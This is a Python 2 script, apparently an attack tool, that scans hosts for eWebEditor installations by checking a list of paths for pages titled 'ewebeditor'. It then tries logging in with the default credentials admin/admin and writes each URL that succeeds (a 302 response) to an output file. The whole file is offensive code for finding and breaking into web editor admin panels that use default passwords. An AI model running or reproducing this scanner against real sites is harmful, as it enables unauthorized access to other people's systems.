#!coding=utf-8

import httplib
import urlparse
#import urllib2
import re
'''
@usr=admin&pwd=admin
'''

class ewebeditor:
	def __init__(self,urls,list_paths):
		self.urls=urls
		self.headers = {
		           'User-Agent':'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0',
		           'Referer':self.urls,
		           'Content-Type': 'application/x-www-form-urlencoded'

		        }
		self.list_paths=list_paths
		
	def run(self):
		if self.jar("/",1):
			for i in self.list_paths:
				i=i.replace("\n","")
				if self.jar(i):
					self.result=urlparse.urljoin("http://"+self.urls,i)
					self.path=i

					self.attack()
					
					break

	def attack(self):
		data="usr=admin&pwd=admin"

		# u=urllib2.Request(url=self.result+"?action=login",data=data,headers=self.headers)  #可以通过抓包观察
		# f=urllib2.urlopen(u)
		# print f.code
		
		con=httplib.HTTPConnection(self.urls,80,True,timeout=5)
		con.request("POST",self.path+"?action=login",data,self.headers)
		r=con.getresponse()
		status=r.status

		if status==302:
			print "[*eweb*]"+self.result+"  admin   admin"
			f=open("./output/output.txt","a")
			f.write(self.result+"\n")
			f.close()


	def jar(self,i,tag=0):
		try:
			#print self.urls
			con=httplib.HTTPConnection(self.urls,80,True,timeout=5)
			con.request("GET",i,"",self.headers)
			r=con.getresponse()
			status=r.status

			if tag==1:
				if status==200:
					return True
				else:
					return False
			else:
				body=r.read().lower()
				res=r"<title>.*</title>"
				p=re.compile(res)
				L=p.findall(body)

				if len(L)>0:
					title=L[0]
				else:
					title=""

				if status==200:
					if "ewebeditor" in title:
						return True
					else:
						return False
				else:
					return False
			con.close()
		except Exception,e:
			#print "eweb",e
			return False


	


		
